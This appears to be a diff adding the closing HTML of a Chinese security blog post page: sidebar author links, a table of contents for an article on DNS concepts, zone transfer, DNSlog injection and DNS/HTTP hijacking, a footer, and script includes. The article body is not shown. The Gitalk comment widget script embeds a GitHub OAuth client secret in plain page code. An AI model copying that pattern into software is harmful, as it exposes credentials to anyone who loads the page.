+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基本概念"><span class="nav-number">2.</span> <span class="nav-text">基本概念</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#根域"><span class="nav-number">2.1.</span> <span class="nav-text">根域</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#域的划分"><span class="nav-number">2.2.</span> <span class="nav-text">域的划分</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#域名服务器"><span class="nav-number">2.3.</span> <span class="nav-text">域名服务器</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解析过程"><span class="nav-number">3.</span> <span class="nav-text">解析过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#工具使用"><span class="nav-number">4.</span> <span class="nav-text">工具使用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#nslookup"><span class="nav-number">4.1.</span> <span class="nav-text">nslookup</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Dig"><span class="nav-number">4.2.</span> <span class="nav-text">Dig</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">5.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DNS域传送（DNS-Zone-Transfer-）"><span class="nav-number">5.1.</span> <span class="nav-text">DNS域传送（DNS Zone Transfer ）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#验证及修复"><span class="nav-number">5.2.</span> <span class="nav-text">验证及修复</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#nslookup-1"><span class="nav-number">5.2.1.</span> <span class="nav-text">nslookup</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Namp"><span class="nav-number">5.2.2.</span> <span class="nav-text">Namp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dig"><span class="nav-number">5.2.3.</span> <span class="nav-text">dig</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DNSlog注入"><span class="nav-number">5.3.</span> <span class="nav-text">DNSlog注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Dnslog基本原理"><span class="nav-number">5.3.1.</span> <span class="nav-text">Dnslog基本原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Dnslog工具及利用"><span class="nav-number">5.3.2.</span> <span class="nav-text">Dnslog工具及利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DNS劫持"><span class="nav-number">5.4.</span> <span class="nav-text">DNS劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#手法"><span class="nav-number">5.4.1.</span> <span class="nav-text">手法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#第一种："><span class="nav-number">5.4.1.1.</span> <span class="nav-text">第一种：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#第二种："><span class="nav-number">5.4.1.2.</span> <span class="nav-text">第二种：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP劫持"><span class="nav-number">5.5.</span> <span class="nav-text">HTTP劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#解决办法"><span class="nav-number">5.5.1.</span> <span class="nav-text">解决办法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">6.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
